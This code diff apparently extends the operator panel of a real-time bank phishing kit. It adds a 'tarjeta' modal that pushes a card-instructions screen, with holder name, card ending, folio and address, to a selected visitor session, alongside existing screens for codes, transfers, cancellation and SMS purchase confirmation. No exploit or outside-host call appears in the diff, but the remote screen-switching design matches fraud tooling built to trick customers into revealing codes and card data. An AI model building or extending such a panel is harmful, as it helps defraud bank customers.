@@ -10,7 +10,7 @@ import AccessTable from '@/components/admin/AccessTable';
 import UserManagement from '@/components/admin/UserManagement';
 import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
 import SmsManagement from '@/components/admin/SmsManagement';
-import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
+import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal } from '@/components/admin/Modals';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
@@ -454,7 +454,7 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
@@ -519,6 +519,18 @@ export default function AdminPanel() {
       sessionId: selectedSessionId,
       titular: data.cliente,
       terminacion: data.terminacion
+    });
+    closeModal();
+  };
+  
+  const handleCardInstructionsConfirm = (data: { cliente: string, terminacion: string, folio: string, direccion: string }) => {
+    sendScreenChange({
+      tipo: 'mostrar_tarjeta',
+      sessionId: selectedSessionId,
+      titular: data.cliente,
+      terminacion: data.terminacion,
+      folio: data.folio,
+      direccion: data.direccion
     });
     closeModal();
   };
@@ -866,6 +878,11 @@ export default function AdminPanel() {
         isOpen={activeModal === 'cancelacion'} 
         onClose={closeModal} 
         onConfirm={handleCancelConfirm} 
+      />
+      <CardInstructionsModal 
+        isOpen={activeModal === 'tarjeta'} 
+        onClose={closeModal} 
+        onConfirm={handleCardInstructionsConfirm} 
       />
       <CodeModal 
         isOpen={activeModal === 'codigo'} 
